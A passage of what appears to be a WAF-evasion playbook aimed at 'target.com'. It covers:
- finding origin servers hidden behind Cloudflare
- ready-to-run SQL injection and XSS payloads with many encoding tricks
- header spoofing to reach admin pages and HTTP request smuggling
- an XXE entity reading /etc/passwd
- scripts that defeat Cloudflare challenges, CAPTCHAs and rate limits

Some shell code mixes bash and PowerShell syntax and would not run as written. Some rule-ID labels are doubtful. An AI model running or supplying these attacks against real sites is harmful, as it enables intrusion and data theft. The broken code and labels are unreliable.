curl -s https://target.com/ | findstr "rss" | findstr "xml"
curl -s https://target.com/ | findstr "atom" | findstr "xml"
curl -s https://target.com/ | findstr "feed"

# Common feed locations
curl -s https://target.com/feed/
curl -s https://target.com/feed.xml
curl -s https://target.com/rss/
curl -s https://target.com/rss.xml
curl -s https://target.com/atom.xml
curl -s https://target.com/index.xml
curl -s https://target.com/blog/feed/
curl -s https://target.com/blog/feed.xml
```

### Email Headers

If the target sends emails (password resets, notifications), the email headers often reveal the origin server:

```shell
# Check email headers for:
# Received: from <origin-ip>
# Authentication-Results: 
# Return-Path: <bounce@origin-server>
```

**What to look for in email headers:**

```
Received: from mail.target.com (198.51.100.23) by ...
Received-SPF: pass (target.com: domain of no-reply@target.com designates 198.51.100.23 as permitted sender)
DKIM-Signature: d=target.com; s=selector1;
```

### CloudFlair Toolsuite

Specialized tools for finding origin IPs behind Cloudflare:

```shell
# CloudFlair — uses Censys to find origin IPs
pip install cloudflair
cloudflair target.com -o result.json

# CloudFail — uses multiple techniques to find origin
pip install cloudfail
cloudfail -t target.com

# Flumber — DNS history based origin discovery
pip install flumber
flumber --domain target.com

# cf-checker
pip install cf-checker
cf-checker target.com

# BypassCF — uses Shodan/Censys
pip install bypasscf
bypasscf -d target.com
```

**CloudFlair methodology (manual):**

```shell
# Step 1: Get all certificates for the domain
curl -s "https://crt.sh/?q=%25.target.com&output=json" > certs.json

# Step 2: Extract all subdomains
cat certs.json | python3 -c "import sys,json; data=json.load(sys.stdin); \
  [print(d['name_value']) for d in data]" | sort -u > subdomains.txt

# Step 3: Resolve all subdomains — ones that don't resolve to Cloudflare IPs may be origin
while read sub; do
  ip=$(nslookup $sub 2>/dev/null | findstr "Address:" | findstr /v "#" | %{ $_.Trim() })
  if ($ip -and -not ($ip -match "cloudflare")) {
    Write-Output "$sub → $ip"
  }
} < subdomains.txt
```

### Shodan Origin Search

Shodan can be used to find origin servers by searching for unique application fingerprints:

```shell
# Search for the exact domain in SSL certificates
ssl.cert.subject.cn:"target.com"

# Search for the domain in any certificate field
ssl.cert.subject.commonName:"target.com"

# Search for the specific hostname
hostname:"target.com"

# Search for specific HTTP title
http.title:"Target.com"

# Search for specific HTML content
http.html:"target.com"

# Combined search
hostname:"target.com" 200
ssl.cert.subject.cn:"target.com" 200 -cloudflare

# Search for specific response headers
"X-Powered-By: Express" hostname:"target.com"
"Server: nginx" hostname:"target.com"
```

### Censys Search

```shell
# Censys IPv4 search
curl -s "https://search.censys.io/api/v2/hosts/search?q=services.tls.certificates.leaf_data.subject.common_name:target.com" \
  -H "Accept: application/json" -H "Authorization: Basic <base64(uid:secret)>"

# Censys certificate search
curl -s "https://search.censys.io/api/v2/certificates/search?q=parsed.subject.common_name:target.com" \
  -H "Accept: application/json" -H "Authorization: Basic <base64(uid:secret)>"
```

### Google Dorks for Origin IP

```shell
# Site search for unique string
"site:target.com" "internal ip" OR "server ip" OR "origin server"
"site:target.com" "internal use only" OR "management console"
"site:target.com" "powered by" OR "running on"

# Pastebin/Code repo searches
"target.com" site:pastebin.com "internal ip" OR "server"
"target.com" site:github.com "internal" OR "origin" OR "server config"
"target.com" site:gitlab.com "nginx.conf" OR "apache.conf"
"target.com" site:gist.github.com "config" OR "server"

# Error messages exposing origin
"target.com" "nginx" filetype:log
"target.com" "internal server error" filetype:txt

# Third-party monitoring dashboards
"target.com" site:status.github.com
"target.com" site:statuspage.io
"target.com" site:healthchecks.io
"target.com" site:datadoghq.com
"target.com" site:newrelic.com
```

### Subdomain Origin Discovery

Sometimes the WAF only protects the main domain, and subdomains point directly to origin:

```shell
# Brute force subdomains and check which ones bypass the WAF
for sub in $(cat subdomains.txt); do
  url="https://$sub.target.com"
  headers=$(curl -sI "$url" 2>/dev/null)
  status=$(echo "$headers" | findstr "HTTP/" | %{ $_.Split()[1] })
  server=$(echo "$headers" | findstr "Server:" | %{ $_.Split(":")[1] })
  
  if ($status -and $status -ne "403") {
    Write-Output "$url → Status: $status, Server: $server"
  }
done
```

**Technique: Look for subdomains with different WAF/CDN:**

```shell
# If target.com uses Cloudflare, but:
# api.target.com → no Cloudflare headers → direct origin!
# admin.target.com → different IP range → bypass!
# dev.target.com → no WAF → origin!
```

### Origin via SSL/TLS Analysis

Different TLS configurations can help identify origin vs CDN:

```shell
# Cloudflare TLS — no client cert, specific cipher suites
nmap --script ssl-enum-ciphers -p 443 target.com

# Origin TLS — may have different certificate issuer
openssl s_client -connect target.com:443 -servername target.com 2>&1 | openssl x509 -noout -issuer

# Compare TLS certificates between:
# 1. The CDN domain (target.com)
# 2. Direct IPs found from CT logs
openssl s_client -connect 1.2.3.4:443 -servername target.com 2>&1 | openssl x509 -noout -subject -dates
```

---

## Bypass Technique Catalog

### HTTP Method Conversion

Different HTTP methods can bypass different WAF rule sets, especially those tuned to specific methods:

```shell
# Standard GET request with SQLi (likely blocked)
curl "https://target.com/api/users?id=1' OR '1'='1"

# POST request with same payload (may bypass)
curl -X POST "https://target.com/api/users" -d "id=1' OR '1'='1"

# PUT request (different WAF rules for PUT)
curl -X PUT "https://target.com/api/users/1" -H "Content-Type: application/json" -d "{\"name\":\"test' OR '1'='1\"}"

# PATCH request (often minimally inspected)
curl -X PATCH "https://target.com/api/users" -H "Content-Type: application/json" -d "{\"id\":\"1' OR '1'='1\"}"

# DELETE request (often ignored by WAF)
curl -X DELETE "https://target.com/api/users?id=1' OR '1'='1"

# OPTIONS request (WAF may not inspect at all)
curl -X OPTIONS "https://target.com/api/users?id=1' OR '1'='1"

# HEAD request (response headers only, WAF may skip body inspection)
curl -X HEAD "https://target.com/api/users?id=1' OR '1'='1"
```

**Method conversion effectiveness by WAF:**

| WAF | Method Conversion Bypass Likelihood | Notes |
|-----|-----------------------------------|-------|
| Cloudflare | Medium | Some rule sets are method-agnostic |
| AWS WAF | Medium | Depends on rule group configuration |
| Akamai | Low-High | Akamai Kona rules may inspect all methods |
| F5 ASM | Medium | Default policy inspects all methods |
| Imperva | Medium | Custom rules may target specific methods |
| ModSecurity | Low | OWASP CRS is method-agnostic |
| Wordfence | High | Focuses on GET/POST; HEAD/PATCH often allowed |

### Parameter Pollution (HPP)

Duplicate parameters with different delimiters can confuse WAF parsers:

```shell
# Standard parameter — likely blocked
curl "https://target.com/api/search?q=<script>alert(1)</script>"

# Duplicate parameters — WAF and backend may use different params
# PHP: last param wins
# ASP.NET: concatenates params
# Python: last param wins (sometimes)
# Node.js (express): first param wins (sometimes)
# Java: first param wins (sometimes)

# PHP-based WAF (uses last), backend Java (uses first)
curl "https://target.com/api/search?q=safe_value&q=<script>alert(1)</script>"

# ASP.NET based (concatenates)
curl "https://target.com/api/search?q=<script>&q=alert(1)</script>"

# Multiple params with different delimiters
curl "https://target.com/api/search?q=<script>alert(1)</script>&q=test"

# Array-style parameters
curl "https://target.com/api/search?q[]=<script>alert(1)</script>&q[]=test"

# Object-style parameters
curl "https://target.com/api/search?q[key]=<script>alert(1)</script>"

# Mixed GET/POST parameters
curl -X POST "https://target.com/api/search?q=<script>alert(1)</script>" -d "q=test"
```

**HPP bypass by backend/acronym:**

| Backend | Duplicate Param Behavior | Bypass Strategy |
|---------|------------------------|-----------------|
| PHP | Last value wins | ?q=clean&q=payload |
| ASP.NET | Concatenates | ?a=[&a=] → accepts both |
| Node.js/Express | Array (first wins sometimes) | ?q=payload&q=clean (if uses first) |
| Python Flask | List | ?q=payload&q=clean (both sent) |
| Python Django | Last wins | ?q=clean&q=payload |
| Java Servlet | First wins (default) | ?q=payload&q=clean |
| Ruby Rack | Last wins | ?q=clean&q=payload |
| Go | Last wins | ?q=clean&q=payload |

### Encoding Bypasses

#### Double URL Encoding

WAFs typically decode once. If the backend decodes twice, double encoding bypasses the WAF:

```shell
# Normal SQLi (blocked)
?q=1' OR '1'='1

# Single encoded (still detected by WAF)
?q=1%27%20OR%20%271%27%3D%271

# Double encoded (WAF sees: 1%27%20OR%20%271%27%3D%271 — may pass)
?q=1%2527%2520OR%2520%25271%2527%253D%25271
```

**Double encoding reference:**

| Character | Single Encoded | Double Encoded |
|-----------|---------------|----------------|
| `'` | `%27` | `%2527` |
| `"` | `%22` | `%2522` |
| `>` | `%3E` | `%253E` |
| `<` | `%3C` | `%253C` |
| `/` | `%2F` | `%252F` |
| `\` | `%5C` | `%255C` |
| `;` | `%3B` | `%253B` |
| `=` | `%3D` | `%253D` |
| `<space>` | `%20` | `%2520` |
| `(space in body)` | `+` | `%2B` |
| `.` | `%2E` | `%252E` |

#### UTF-16 / Unicode Encoding

WAFs that don't handle Unicode normalization can be bypassed:

```shell
# UTF-8 encoded SQLi (standard, blocked)
Unicode: 1' OR '1'='1
UTF-8:   31 27 20 4F 52 20 27 31 27 3D 27 31

# UTF-16 encoded (WAF may skip non-ASCII inspection)
UTF-16BE: 00 31 00 27 00 20 00 4F 00 52 00 20 00 27 00 31 00 27 00 3D 00 27 00 31
?q=%0031%0027%0020%004F%0052%0020%0027%0031%0027%003D%0027%0031

# Overlong UTF-8 encoding
C0 AE → '.' (overlong encoding of 2E)
E0 80 AE → '.' (overlong 3-byte encoding)
F0 80 80 AE → '.' (overlong 4-byte encoding)

# Invalid UTF-8 sequences
?q=%C0%27  → Invalid 2-byte start → WAF may reject processing
```

#### Unicode Normalization Bypass

Some backends normalize Unicode characters that bypass WAF regexes:

```shell
# SQLi using Unicode homoglyphs
# Replace letters with visually similar Unicode characters
# 'a' → U+0430 (Cyrillic а) — bypasses keyword matching
?q=1' OR '1'='1  → blocked

# With Cyrillic 'O' and 'R':
# OR → ОR (Cyrillic O)
?q=1' ОR '1'='1  → may bypass regex

# IDEOGRAPHIC SPACE (U+3000) instead of regular space
?q=1'　OR　'1'='1  → WAF doesn't match \s but backend normalizes

# Fraction character conversion
½ → 1/2 (used in some character conversion bugs)

# Long right single quotation mark (U+2019) instead of single quote
?q=1\u2019 OR \u20191\u2019=\u20191
```

#### Case Variation

Simple but effective — WAF rules often target lowercase patterns:

```shell
# Standard XSS (blocked)
<script>alert(1)</script>

# Case variation
<Script>alert(1)</Script>
<SCript>alert(1)</SCript>
<SCRipt>alert(1)</SCRipt>
<SCRIpt>alert(1)</SCRIpt>
<SCRIPt>alert(1)</SCRIPt>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

# SQLi case variation
SeLeCt * FrOm users
UNION SELeCT 1,2,3
uNiOn aLl sElEcT 1,2,3
```

### Header Manipulation

False source IP headers can cause WAFs to trust the request:

```shell
# X-Forwarded-For — most commonly used
curl "https://target.com/admin" -H "X-Forwarded-For: 127.0.0.1"
curl "https://target.com/admin" -H "X-Forwarded-For: 10.0.0.1"
curl "https://target.com/admin" -H "X-Forwarded-For: 192.168.1.1"
curl "https://target.com/admin" -H "X-Forwarded-For: 172.16.0.1"

# X-Real-IP — nginx origin
curl "https://target.com/admin" -H "X-Real-IP: 127.0.0.1"

# X-Originating-IP — Microsoft/Exchange
curl "https://target.com/admin" -H "X-Originating-IP: 127.0.0.1"

# X-Remote-IP — some cloud providers
curl "https://target.com/admin" -H "X-Remote-IP: 127.0.0.1"

# X-Client-IP — Squid/HAProxy
curl "https://target.com/admin" -H "X-Client-IP: 127.0.0.1"

# X-Remote-Addr
curl "https://target.com/admin" -H "X-Remote-Addr: 127.0.0.1"

# True-Client-IP — Akamai/AWS
curl "https://target.com/admin" -H "True-Client-IP: 127.0.0.1"

# CF-Connecting-IP — Cloudflare (spoofing may bypass WAF)
curl "https://target.com/admin" -H "CF-Connecting-IP: 127.0.0.1"

# X-Host — host header per request
curl "https://target.com/api" -H "X-Host: internal.target.com"

# X-Forwarded-Host (if WAF checks Host but backend uses X-Forwarded-Host)
curl "https://target.com/" -H "X-Forwarded-Host: admin.target.com"
```

**Internal IP ranges to try:**
```
127.0.0.1               → localhost
10.0.0.0/8              → private network
172.16.0.0/12           → private network
192.168.0.0/16          → private network
100.64.0.0/10           → carrier-grade NAT
::1                     → IPv6 localhost
fe80::/10               → IPv6 link-local
0.0.0.0                 → invalid/null
```

### HTTP Version Downgrade

Downgrading from HTTP/2 (default for HTTPS) to HTTP/1.1 can bypass WAF rules:

```shell
# HTTP/1.0 (older, simpler — fewer WAF rules)
curl --http1.0 "https://target.com/?q=<script>alert(1)</script>"

# HTTP/1.1 (standard)
curl --http1.1 "https://target.com/?q=<script>alert(1)</script>"

# Force HTTP/1.0 with curl
curl -0 "https://target.com/?q=<script>alert(1)</script>"
```

**Why it works:**

HTTP/2 has different framing and normalization than HTTP/1.1. WAFs that decode HTTP/2 headers differently than HTTP/1.1 may miss:

- Header name normalization differences
- Pseudo-header handling (":method", ":path")
- Request body framing differences
- Cookie parsing differences

### Protocol Smuggling

HTTP/2 to HTTP/1.1 downgrade smuggling:

```shell
# HTTP/2 request that, when downgraded to HTTP/1.1 by CDN,
# creates a different interpretation at the backend

# Smuggle a full HTTP request inside HTTP/2 headers
curl -k --http2 "https://target.com/" \
  -H ":method: GET" \
  -H ":path: /" \
  -H ":scheme: https" \
  -H "foo: bar\r\nTransfer-Encoding: chunked" \
  -H "Host: target.com"
```

**Transfer-Encoding manipulation:**

```shell
# CL.TE smuggling
# Frontend uses Content-Length, backend uses Transfer-Encoding
curl -X POST "https://target.com/api/search" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d "30
POST /api/admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length: 15

x=1
0

"

# TE.CL smuggling
# Frontend uses Transfer-Encoding, backend uses Content-Length
curl -X POST "https://target.com/api/search" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 60" \
  -d "0

POST /api/admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length: 15

x=1"
```

**HTTP/2 downgrade smuggling:**

```
In HTTP/2:  Header ":path" can contain CRLF
:path: /api/search HTTP/1.1\r\nHost: target.com\r\n\r\nGET /api/admin

↓ When downgraded to HTTP/1.1 by CDN:

GET /api/search HTTP/1.1
Host: target.com

GET /api/admin HTTP/1.1
Host: target.com
```

### Chunked Body with Different TE Values

Varying `Transfer-Encoding` header values to confuse parsing:

```shell
# TE value variations
curl -X POST "https://target.com/api" \
  -H "Transfer-Encoding: chunked" \
  -d "5
x=1
0
"

curl -X POST "https://target.com/api" \
  -H "Transfer-Encoding: chunked" \
  -H "Transfer-Encoding: identity" \
  -d "payload"

curl -X POST "https://target.com/api" \
  -H "Transfer-Encoding: chunked, identity" \
  -d "payload"

curl -X POST "https://target.com/api" \
  -H "Transfer-Encoding: \x63hunked" \
  -d "5
x=1
0
"

# Multiple TE headers
curl -X POST "https://target.com/api" \
  -H "Transfer-Encoding: x" \
  -H "Transfer-Encoding: chunked" \
  -d "payload"
```

### Comment Injection

Injecting comments into payload strings to break WAF regex:

```shell
# SQLi with inline comments
1'/**/OR/**/'1'/**/=/**/'1
1'/*!*/OR/*!*/'1'/*!*/=/*!*/'1
1'-- -OR'1'='1
1' --+ OR '1'='1
1'/*!50000OR*/'1'='1

# XSS with comment injection
<scr<!-->ipt>alert(1)</scr<!-->ipt>
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<<!-->script>alert(1)</<!-->script>

# XML/XXE comments
<!--[CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]>
```

**ModSecurity CRS-specific comment bypass:**

```shell
# ModSecurity CRS rule 942100 (SQL injection) can be bypassed with:
1' 0x00 OR '1'='1
1' %00 OR '1'='1
1' /*!%00*/ OR '1'='1
```

### Null Byte Injection

Null bytes can terminate WAF parsing early:

```shell
# Null byte in URL
?q=1'%00 OR '1'='1

# Null byte in parameter value
POST /api
Content-Type: application/x-www-form-urlencoded
q=1'%00 OR '1'='1

# Null byte in multipart boundary
Content-Type: multipart/form-data; boundary=%00boundary

# Null byte in filename
Content-Disposition: form-data; name="file"; filename="test.php%00.jpg"
```

### Unicode Escapes

Using Unicode escape sequences that the backend normalizes:

```shell
# MySQL Unicode escapes
\u0027 → '
\u0022 → "
\u003C → <
\u003E → >
\u002F → /
\u005C → \

# SQLi with Unicode escapes
?q=1\u0027 OR \u00271\u0027=\u00271

# MySQL-specific
?q=1\x27 OR \x271\x27=\x27
?q=1\x27\x20OR\x20\x271\x27\x3D\x271

# MSSQL-specific
?q=1%CHAR(39)%20OR%20%271%27=%271
?q=1%char(39)%20union%20select%20...
```

### Case Variation

Beyond simple case changes:

```shell
# SQL keywords
Union Select
uNiOn sElEcT
UNION SELECT
union select

# XSS event handlers
onLoad
ONLOAD
OnLOad
oNlOaD

# XSS tags
<SCRIPT>
<Script>
<ScRiPt>

# HTTP headers
Content-Type: text/xml
Content-type: text/xml
content-type: text/xml

# Paths
/ADMIN/
/Admin/
/admin/
/admiN/
```

### Mixed Encoding

Combining multiple encoding techniques:

```shell
# URL + Unicode + case variation
?q=1%27%20%u004F%u0052%20%271%27%3D%271
# Decoded: 1' OR '1'='1

# Double encoding + null byte + comment
?q=1%2527%00/**/OR/**/%25271%2527%253D%25271

# HTML entities + URL encoding
?q=1&#39;&#32;&#79;&#82;&#32;&#39;&#49;&#39;&#61;&#39;&#49;
# URL encoded: ?q=1%26%2339%3B%26%2332%3B%26%2379%3B%26%2382%3B%26%2332%3B%26%2339%3B%26%2349%3B%26%2339%3B%26%2361%3B%26%2339%3B%26%2349%3B

# Base64 encoding (if backend decodes)
?q=MScgT1IgJzEnPScx
# Base64 of: 1' OR '1'='1

# Hex encoding
?q=0x3127204f52202731273d2731
# Hex of: 1' OR '1'='1

# Octal encoding in PHP
?q=\061\047\040\117\122\040\047\061\047\075\047\061
```

---

## Cloudflare-Specific Bypasses

### CloudScraper Methodology

```python
import cloudscraper

# Create a scraper that mimics browser TLS fingerprint
scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'windows',
        'mobile': False,
        'desktop': True,
    },
    delay=15,  # Delay between retries (seconds)
    interpreter='native',  # Use native JS interpreter for challenge solving
)

# Requests automatically handle JS challenge
response = scraper.get('https://target.com/')
print(response.status_code)
print(response.text[:500])

# With custom headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...',
    'Accept-Language': 'en-US,en;q=0.9',
}
response = scraper.get('https://target.com/protected-page', headers=headers)
```

**CloudScraper vs Cloudflare challenges:**

| Challenge Type | CloudScraper Support | Notes |
|---------------|---------------------|-------|
| JS Challenge (IUAM) | ✅ Bypassed | Solves JS challenge automatically |
| CAPTCHA | ❌ Not bypassed | Requires human or CAPTCHA solving service |
| 5-second shield | ✅ Bypassed | Waits and follows redirect |
| WAF block (1020) | ❌ Cannot bypass | Different mechanism — needs payload modification |
| Bot Management | ❌ Partial | Newer fingerprinting bypasses CloudScraper |

### cf_clearance Cookie Extraction

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import json
import time

def get_cf_clearance(url):
    """Use browser automation to solve Cloudflare challenge and extract cookies."""
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)
    
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    
    # Wait for challenge to complete
    time.sleep(10)  # Adjust based on challenge complexity
    
    # Extract cookies
    cookies = driver.get_cookies()
    cf_cookies = {c['name']: c['value'] for c in cookies 
                  if c['name'] in ['cf_clearance', '__cf_bm']}
    
    driver.quit()
    return cf_cookies

# Usage
cookies = get_cf_clearance('https://target.com/')
print(f"cf_clearance: {cookies.get('cf_clearance', 'Not found')}")

# Now use the cookies in requests
import requests
session = requests.Session()
session.cookies.update(cookies)
response = session.get('https://target.com/protected-endpoint')
```

### Browser Automation with Playwright/Puppeteer

Playwright provides more robust automation for Cloudflare challenge solving:

```python
from playwright.sync_api import sync_playwright
import json

def solve_cloudflare(url):
    """Use Playwright to solve Cloudflare challenges and persist session."""
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--disable-blink-features=AutomationControlled']
        )
        
        context = browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...',
            viewport={'width': 1920, 'height': 1080},
            locale='en-US',
        )
        
        page = context.new_page()
        
        # Navigate and wait for challenge to complete
        page.goto(url, wait_until='networkidle', timeout=60000)
        
        # Extract cookies
        cookies = context.cookies()
        cf_cookies = {c['name']: c['value'] for c in cookies 
                      if c['name'] in ['cf_clearance', '__cf_bm']}
        
        # Save storage state for reuse
        context.storage_state(path='./cf_state.json')
        
        browser.close()
        return cf_cookies

# Reuse saved state
with sync_playwright() as p:
    browser = p.chromium.launch()
    context = browser.new_context(storage_state='./cf_state.json')
    page = context.new_page()
    page.goto('https://target.com/protected')
```

**Puppeteer equivalent (Node.js):**
```javascript
const puppeteer = require('puppeteer');

async function getCfClearance(url) {
  const browser = await puppeteer.launch({
    headless: 'new',
    args: ['--disable-blink-features=AutomationControlled']
  });
  
  const page = await browser.newPage();
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64)...');
  await page.goto(url, { waitUntil: 'networkidle0', timeout: 60000 });
  
  const cookies = await page.cookies();
  const cfCookies = cookies.filter(c => 
    ['cf_clearance', '__cf_bm'].includes(c.name)
  );
  
  await browser.close();
  return cfCookies;
}
```

### JS Challenge Solving

Manual approach for Cloudflare JS challenge:

```shell
# Step 1: Get the challenge page
curl -c /tmp/cookies.txt -s "https://target.com/" > /tmp/challenge.html

# Step 2: Extract the challenge JS
# Look for the <script> tag containing the challenge
python3 -c "
import re
html = open('/tmp/challenge.html').read()
# Extract the obfuscated JS challenge
match = re.search(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
if match:
    js_code = match.group(1)
    # Look for specific Cloudflare challenge patterns
    if 'challenge' in js_code or 'cf' in js_code.lower():
        print('Challenge JS found')
        print(js_code[:500])
"

# Step 3: Solve the challenge (requires JS engine)
# Node.js-based solver:
cat << 'EOF' > /tmp/solve.js
const jsdom = require('jsdom');
const { JSDOM } = jsdom;
const dom = new JSDOM(`<!DOCTYPE html><html><body></body></html>`);
global.window = dom.window;
global.document = dom.window.document;
global.navigator = dom.window.navigator;

// Paste challenge JS here and evaluate
// Extract the cookie from the solved challenge
// Output the cookie value for curl
EOF

node /tmp/solve.js

# Step 4: Use the cf_clearance cookie
curl -b "cf_clearance=<solved-value>" -c /tmp/cookies.txt "https://target.com/"
```

### CAPTCHA Bypass Approaches

CAPTCHA challenges from Cloudflare typically require external solving services:

```python
# Using 2captcha service (paid)
import requests

API_KEY = 'your_2captcha_api_key'

def solve_cloudflare_captcha(page_url, site_key):
    """Solve Cloudflare CAPTCHA using external service."""
    # Submit CAPTCHA
    resp = requests.post('https://2captcha.com/in.php', data={
        'key': API_KEY,
        'method': 'hcaptcha',
        'sitekey': site_key,
        'pageurl': page_url,
        'json': 1,
    })
    
    request_id = resp.json().get('request')
    
    # Poll for solution
    for _ in range(60):
        time.sleep(5)
        resp = requests.get('https://2captcha.com/res.php', params={
            'key': API_KEY,
            'action': 'get',
            'id': request_id,
            'json': 1,
        })
        if resp.json().get('status') == 1:
            return resp.json().get('request')
    
    return None

# Alternative: Browser automation with manual intervention
def solve_captcha_manually(url):
    """Open browser for manual CAPTCHA solving."""
    import subprocess
    # Launch browser with remote debugging
    subprocess.Popen([
        'chrome.exe',
        f'--remote-debugging-port=9222',
        url,
    ])
    print("Please solve the CAPTCHA in the browser window...")
    input("Press Enter after solving the CAPTCHA...")
    
    # Extract cookies from the browser instance
    # (requires CDP connection)
```

### Rate Limit Evading

```python
import requests
import time
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class CloudflareRateLimitEvader:
    """Evade Cloudflare rate limiting with request pacing."""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 ...',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Retry on 429 / 503
        retry = Retry(
            total=5,
            backoff_factor=random.uniform(1, 3),
            status_forcelist=[429, 503, 520, 521, 522, 523, 524],
            respect_retry_after_header=True,
        )
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('https://', adapter)
        
        self.request_count = 0
        self.last_request_time = 0
        
    def request(self, method, path, **kwargs):
        """Send request with rate limiting awareness."""
        self.request_count += 1
        
        # Add jitter between requests
        delay = random.uniform(1.0, 3.0)
        time_since_last = time.time() - self.last_request_time
        if time_since_last < delay:
            time.sleep(delay - time_since_last)
        
        # Rotate user-agent periodically
        if self.request_count % 10 == 0:
            self._rotate_user_agent()
        
        url = self.base_url + path
        resp = self.session.request(method, url, **kwargs)
        self.last_request_time = time.time()
        
        # Detect rate limiting
        if resp.status_code == 429:
            retry_after = int(resp.headers.get('Retry-After', 60))
            print(f"[RATE LIMITED] Waiting {retry_after}s")
            time.sleep(retry_after)
            return self.request(method, path, **kwargs)
        
        # Detect WAF block
        if resp.status_code == 503 and 'cf-error-details' in resp.text:
            print(f"[WAF BLOCKED] Request {self.request_count}")
            time.sleep(30)
            return self.request(method, path, **kwargs)
        
        return resp
    
    def _rotate_user_agent(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        ]
        self.session.headers.update({'User-Agent': random.choice(agents)})

# Usage
evader = CloudflareRateLimitEvader('https://target.com')
resp = evader.request('GET', '/api/endpoint')
```

### WAF Rule ID Identification

Identifying specific Cloudflare WAF rule IDs triggered by payloads:

```shell
# Check for the WAF rule ID in the response body
curl -s "https://target.com/?q=<script>alert(1)</script>" | findstr "cf-error-code"
curl -s "https://target.com/?q=<script>alert(1)</script>" | findstr "1020"

# Common Cloudflare WAF rule IDs:
# 981176  → SQL Injection - SQLI
# 981242  → SQL Injection Blind
# 941100  → XSS - HTML Tag
# 941101  → XSS - Event Handlers
# 941110  → XSS - Script Tag
# 941120  → XSS - URL
# 941130  → XSS - Attribute
# 942100  → SQL Injection - SQLI
# 942110  → SQL Injection - Blind
# 942120  → SQL Injection - SQLI
# 942130  → SQL Injection - Tautology
# 942140  → SQL Injection - Comment
# 942150  → SQL Injection - Function
# 942160  → SQL Injection - Sleep
# 942170  → SQL Injection - Benchmark
# 942180  → SQL Injection - Stacked
# 942190  → SQL Injection - Hex
# 942200  → SQL Injection - Like
# 942210  → SQL Injection - "1=1"
# 942220  → SQL Injection - \"OR\""
# 942230  → SQL Injection - SQLI
# 942240  → SQL Injection - SQLI
# 942250  → SQL Injection - Union
# 942260  → SQL Injection - Union Select
# 942270  → SQL Injection - Union Select
# 942280  → SQL Injection - Union Select
# 942290  → SQL Injection - MSSQL
# 942300  → SQL Injection - MySQL
# 942310  → SQL Injection - Conditional
# 942320  → SQL Injection - boolean
# 942330  → SQL Injection - classic
# 942340  → SQL Injection - Blind
# 942350  → SQL Injection - Comment
# 942360  → SQL Injection - Detects basic SQL injection
# 942370  → SQL Injection - Detects classic SQL injection
# 942380  → SQL Injection - Detects SQL injection
# 942390  → SQL Injection - Detects SQL injection
# 942400  → SQL Injection - Detects SQL injection
# 942410  → SQL Injection - LIKE
# 942420  → SQL Injection - Restricted SQL Character
# 942430  → SQL Injection - Restricted SQL Character
# 942440  → SQL Injection - Comment Sequence
# 942450  → SQL Injection - Hex Encoding
# 942460  → SQL Injection - Meta-Character
# 942470  → SQL Injection - SQL Injection
# 942480  → SQL Injection - SQL Injection
```

---

## Bypass Validation

### Confirming Bypass Actually Reached Origin

The critical question: did the request bypass the WAF and reach the origin server?

```shell
# Method 1: Response headers comparison
# Baseline (no payload)
curl -sI "https://target.com/" > baseline_headers.txt
type baseline_headers.txt

# Payload with bypass
curl -sI "https://target.com/?q=<script>alert(1)</script>" > bypass_headers.txt
type bypass_headers.txt

# Compare headers — if they match, request went through WAF
# If different (missing CF-* headers), may have reached origin
fc baseline_headers.txt bypass_headers.txt
```

**Header signs of successful bypass:**

| If You See | Interpretation |
|------------|----------------|
| Missing `CF-Ray` | Request bypassed Cloudflare |
| Missing `X-Served-By` | Request bypassed Fastly |
| `Server: nginx` (not `cloudflare`) | Direct origin hit |
| `Age: 0` or `Age: <value>` | Cache miss — request reached origin |
| `X-Cache: Miss from cloudfront` | Reached origin (not cached) |
| `CF-Cache-Status: BYPASS` | Bypassed Cloudflare cache |

### Response Comparison

```python
import requests
import difflib

def validate_bypass(url, payload, session=None):
    """Compare blocked vs potentially bypassed response."""
    s = session or requests.Session()
    
    # Baseline: clean request
    clean = s.get(url, params={'q': 'test'})
    
    # Blocked: known-trigger payload
    blocked = s.get(url, params={'q': payload['blocked']})
    
    # Bypass attempt
    bypass = s.get(url, params={'q': payload['bypass']})
    
    results = {
        'clean_status': clean.status_code,
        'clean_length': len(clean.text),
        'blocked_status': blocked.status_code,
        'blocked_length': len(blocked.text),
        'bypass_status': bypass.status_code,
